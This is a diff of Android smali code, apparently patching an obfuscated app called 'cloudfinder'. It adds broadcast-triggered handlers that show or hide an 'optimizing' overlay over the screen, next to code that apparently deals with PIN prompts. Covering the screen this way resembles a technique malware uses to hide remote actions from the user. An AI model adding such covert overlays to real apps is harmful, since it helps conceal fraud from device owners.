@@ -123,6 +123,33 @@
     return-void
 
     :not_pin_prompt
+    # 2.2 调试入口：OVERLAY_ON / OVERLAY_OFF 手动控制“优化中”遮罩
+    const-string v1, "com.lite.cloudfinder.OVERLAY_ON"
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-eqz v1, :not_ov_on
+
+    invoke-static {p1}, Lڗًقڔ/؋;->ٽ(Landroid/content/Context;)V
+
+    return-void
+
+    :not_ov_on
+    const-string v1, "com.lite.cloudfinder.OVERLAY_OFF"
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-eqz v1, :not_ov_off
+
+    invoke-static {}, Lڗًقڔ/؋;->ؿ()V
+
+    return-void
+
+    :not_ov_off
     invoke-virtual {v0}, Ljava/lang/String;->hashCode()I
 
     move-result v1
